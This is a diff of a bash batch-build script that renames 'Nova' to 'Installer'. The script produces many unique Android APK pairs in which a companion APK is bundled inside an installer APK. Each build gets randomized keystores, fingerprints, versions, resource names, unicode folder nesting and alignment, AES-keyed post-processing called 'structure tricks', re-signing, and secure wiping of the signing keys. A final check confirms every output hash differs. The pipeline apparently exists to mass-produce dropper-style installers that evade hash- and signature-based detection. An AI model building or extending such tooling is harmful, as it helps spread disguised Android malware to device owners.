@@ -2,7 +2,7 @@
 # =============================================================================
 # generate_batch.sh — Steps 9 / 11 / 18 / 17A-17H / 22
 # Usage: ./generate_batch.sh <N>
-# Generates N unique companion+Nova APK pairs.
+# Generates N unique Companion+Installer APK pairs.
 # Output: batch_output/001/, batch_output/002/, ...
 #
 # Full per-step tracking: every phase and every step writes to
@@ -374,12 +374,12 @@ for i in $(seq 1 "$N"); do
     fi
 
     # ════════════════════════════════════════════════════════════════════════
-    # PHASE 1 — NOVA GRADLE BUILD
+    # PHASE 1 — INSTALLER GRADLE BUILD
     # ════════════════════════════════════════════════════════════════════════
     echo "" | tee -a "${AUDIT_LOG}"
-    echo "  ══ PHASE 1 — NOVA GRADLE BUILD ══" | tee -a "${AUDIT_LOG}"
+    echo "  ══ PHASE 1 — INSTALLER GRADLE BUILD ══" | tee -a "${AUDIT_LOG}"
 
-    NOVA_BUILD_LOG="${PAIR_DIR}/nova_build.log"
+    INSTALLER_BUILD_LOG="${PAIR_DIR}/installer_build.log"
 
     # Ensure gradlew is executable — git checkout does not preserve +x
     track_step "${AUDIT_LOG}" "PHASE_1" "STEP_GRADLEW_CHMOD" \
@@ -390,26 +390,26 @@ for i in $(seq 1 "$N"); do
     track_step "${AUDIT_LOG}" "PHASE_1" "STEP_GRADLE_CLEAN" \
         "Gradle clean" \
         "-" \
-        bash -c "./gradlew clean --quiet --no-daemon 2>&1 | tee -a '${NOVA_BUILD_LOG}'; exit \${PIPESTATUS[0]}"
+        bash -c "./gradlew clean --quiet --no-daemon 2>&1 | tee -a '${INSTALLER_BUILD_LOG}'; exit \${PIPESTATUS[0]}"
 
     track_step "${AUDIT_LOG}" "PHASE_1" "STEP_GRADLE_ASSEMBLE" \
         "Gradle assembleRelease (keystore+fingerprint+versionRandom+resRename+watermark)" \
         "-" \
-        bash -c "./gradlew assembleRelease --no-daemon 2>&1 | tee '${NOVA_BUILD_LOG}'; exit \${PIPESTATUS[0]}"
+        bash -c "./gradlew assembleRelease --no-daemon 2>&1 | tee '${INSTALLER_BUILD_LOG}'; exit \${PIPESTATUS[0]}"
 
     if [ $? -ne 0 ]; then
-        echo "  ❌ NOVA GRADLE BUILD FAILED — aborting pair ${IDX}" | tee -a "${AUDIT_LOG}"
-        echo "PAIR_${IDX}=NOVA_GRADLE_FAILED" >> "${INTEGRITY_LOG}"
-        echo "PAIR_${IDX} | NOVA_GRADLE_FAILED | $(now)" >> "${SUMMARY_LOG}"
+        echo "  ❌ INSTALLER GRADLE BUILD FAILED — aborting pair ${IDX}" | tee -a "${AUDIT_LOG}"
+        echo "PAIR_${IDX}=INSTALLER_GRADLE_FAILED" >> "${INTEGRITY_LOG}"
+        echo "PAIR_${IDX} | INSTALLER_GRADLE_FAILED | $(now)" >> "${SUMMARY_LOG}"
         FAILED=$((FAILED + 1))
-        PAIR_STATUS="NOVA_GRADLE_FAILED"
+        PAIR_STATUS="INSTALLER_GRADLE_FAILED"
         continue
     fi
 
-    # ── Find Nova APK ─────────────────────────────────────────────────────
-    NOVA_APK=$(find "${REPO_ROOT}/app/build/outputs/apk/release" -name "*.apk" | head -1)
-    if [ -z "${NOVA_APK}" ] || [ ! -f "${NOVA_APK}" ]; then
-        echo "  ❌ Nova APK not found after Gradle build" | tee -a "${AUDIT_LOG}"
+    # ── Find Installer APK ─────────────────────────────────────────────────────
+    INSTALLER_APK=$(find "${REPO_ROOT}/app/build/outputs/apk/release" -name "*.apk" | head -1)
+    if [ -z "${INSTALLER_APK}" ] || [ ! -f "${INSTALLER_APK}" ]; then
+        echo "  ❌ Installer APK not found after Gradle build" | tee -a "${AUDIT_LOG}"
         echo "PAIR_${IDX}=NO_APK" >> "${INTEGRITY_LOG}"
         echo "PAIR_${IDX} | NO_APK | $(now)" >> "${SUMMARY_LOG}"
         FAILED=$((FAILED + 1))
@@ -417,45 +417,45 @@ for i in $(seq 1 "$N"); do
     fi
 
     {
-        echo "  Nova APK  : $(basename "${NOVA_APK}")"
-        echo "  APK size  : $(apk_size "${NOVA_APK}") bytes"
-        echo "  APK md5   : $(apk_md5 "${NOVA_APK}")"
+        echo "  Installer APK: $(basename "${INSTALLER_APK}")"
+        echo "  APK size  : $(apk_size "${INSTALLER_APK}") bytes"
+        echo "  APK md5   : $(apk_md5 "${INSTALLER_APK}")"
     } | tee -a "${AUDIT_LOG}"
 
     # ════════════════════════════════════════════════════════════════════════
-    # PHASE 2 — NOVA APK STRUCTURE TRICKS
+    # PHASE 2 — INSTALLER APK STRUCTURE
     # ════════════════════════════════════════════════════════════════════════
     echo "" | tee -a "${AUDIT_LOG}"
-    echo "  ══ PHASE 2 — NOVA APK STRUCTURE ══" | tee -a "${AUDIT_LOG}"
+    echo "  ══ PHASE 2 — INSTALLER APK STRUCTURE ══" | tee -a "${AUDIT_LOG}"
 
     # Step 18 — unicode folder nesting
     BUILD_HASH=$(python3 -c "import hashlib; print(hashlib.sha256('${IDX}'.encode()).hexdigest())")
     track_step "${AUDIT_LOG}" "PHASE_2" "STEP_18" \
-        "Nova deep unicode folder nesting [Step 18]" \
-        "${NOVA_APK}" \
+        "Installer deep unicode folder nesting [Step 18]" \
+        "${INSTALLER_APK}" \
         bash -c "python3 - << 'PYEOF'
 import sys
 sys.path.insert(0, '${SCRIPT_DIR}')
-from build_module import step_nova_unicode_nest
-step_nova_unicode_nest('${NOVA_APK}', '${BUILD_HASH}')
+from build_module import step_installer_unicode_nest
+step_installer_unicode_nest('${INSTALLER_APK}', '${BUILD_HASH}')
 PYEOF"
 
     # Step 22 — zipalign randomization
     ALIGN=$(python3 -c "import random; print(random.choice([4, 8]))")
-    NOVA_APK_ALIGNED="${NOVA_APK%.apk}_aligned.apk"
+    INSTALLER_APK_ALIGNED="${INSTALLER_APK%.apk}_aligned.apk"
     track_step "${AUDIT_LOG}" "PHASE_2" "STEP_22" \
         "APK alignment randomization alignment=${ALIGN} [Step 22]" \
-        "${NOVA_APK}" \
-        bash -c "zipalign -f '${ALIGN}' '${NOVA_APK}' '${NOVA_APK_ALIGNED}' && mv '${NOVA_APK_ALIGNED}' '${NOVA_APK}'"
+        "${INSTALLER_APK}" \
+        bash -c "zipalign -f '${ALIGN}' '${INSTALLER_APK}' '${INSTALLER_APK_ALIGNED}' && mv '${INSTALLER_APK_ALIGNED}' '${INSTALLER_APK}'"
 
     # Steps 17A-17H via phase2_postprocess
-    phase2_postprocess "${NOVA_APK}" "${AES_KEY}" "NOVA" "${AUDIT_LOG}"
+    phase2_postprocess "${INSTALLER_APK}" "${AES_KEY}" "INSTALLER" "${AUDIT_LOG}"
 
     # ════════════════════════════════════════════════════════════════════════
-    # SIGNING — Re-sign Nova after all post-processing
+    # SIGNING — Re-sign Installer after all post-processing
     # ════════════════════════════════════════════════════════════════════════
     echo "" | tee -a "${AUDIT_LOG}"
-    echo "  ══ SIGNING — RE-SIGN NOVA APK ══" | tee -a "${AUDIT_LOG}"
+    echo "  ══ SIGNING — RE-SIGN INSTALLER APK ══" | tee -a "${AUDIT_LOG}"
 
     CREDS_FILE=$(find "${REPO_ROOT}/app/build/keystore" -name "ks_creds_*.properties" 2>/dev/null | head -1)
 
@@ -480,14 +480,14 @@ PYEOF"
             echo "  [RESIGN] ❌ FAILED — keystore .jks not found at: ${KS_FILE}" | tee -a "${AUDIT_LOG}"
             PAIR_STATUS="RESIGN_NO_JKS"
         else
-            track_sign "${AUDIT_LOG}" "${NOVA_APK}" "${KS_FILE}" "${KS_PASS}" "${KS_ALIAS}"
+            track_sign "${AUDIT_LOG}" "${INSTALLER_APK}" "${KS_FILE}" "${KS_PASS}" "${KS_ALIAS}"
             if [ $? -ne 0 ]; then
                 PAIR_STATUS="RESIGN_FAILED"
             fi
         fi
 
         # Step 21 — inject watermark AFTER successful resign+verify
-        inject_watermark "${NOVA_APK}" "${AUDIT_LOG}"
+        inject_watermark "${INSTALLER_APK}" "${AUDIT_LOG}"
 
         # Secure wipe .jks AND creds file (3-pass) after re-sign
         python3 -c "
@@ -516,20 +516,20 @@ secure_wipe('${CREDS_FILE}')
     echo "" | tee -a "${AUDIT_LOG}"
     echo "  ══ OUTPUT ══" | tee -a "${AUDIT_LOG}"
 
-    NOVA_NAME="nova_${IDX}_$(basename "${NOVA_APK}")"
-    cp "${NOVA_APK}" "${PAIR_DIR}/${NOVA_NAME}"
+    INSTALLER_NAME="installer_${IDX}_$(basename "${INSTALLER_APK}")"
+    cp "${INSTALLER_APK}" "${PAIR_DIR}/${INSTALLER_NAME}"
 
     MOD_APK="${REPO_ROOT}/app/src/main/assets/companion.apk"
     if [ -f "${MOD_APK}" ]; then
         cp "${MOD_APK}" "${PAIR_DIR}/companion_${IDX}.apk"
     fi
 
-    MD5=$(apk_md5 "${PAIR_DIR}/${NOVA_NAME}")
-    SHA256=$(apk_sha256 "${PAIR_DIR}/${NOVA_NAME}")
-    SIZE=$(du -h "${PAIR_DIR}/${NOVA_NAME}" | cut -f1)
+    MD5=$(apk_md5 "${PAIR_DIR}/${INSTALLER_NAME}")
+    SHA256=$(apk_sha256 "${PAIR_DIR}/${INSTALLER_NAME}")
+    SIZE=$(du -h "${PAIR_DIR}/${INSTALLER_NAME}" | cut -f1)
 
     {
-        echo "  Output APK : ${NOVA_NAME}"
+        echo "  Output APK : ${INSTALLER_NAME}"
         echo "  Size       : ${SIZE}"
         echo "  MD5        : ${MD5}"
         echo "  SHA256     : ${SHA256}"
@@ -549,7 +549,7 @@ secure_wipe('${CREDS_FILE}')
     SEEN_SHA256[$SHA256]="${IDX}"
 
     {
-        echo "PAIR_${IDX}_NOVA=${NOVA_NAME}"
+        echo "PAIR_${IDX}_INSTALLER=${INSTALLER_NAME}"
         echo "PAIR_${IDX}_MD5=${MD5}"
         echo "PAIR_${IDX}_SHA256=${SHA256}"
         echo "PAIR_${IDX}_SIZE=${SIZE}"
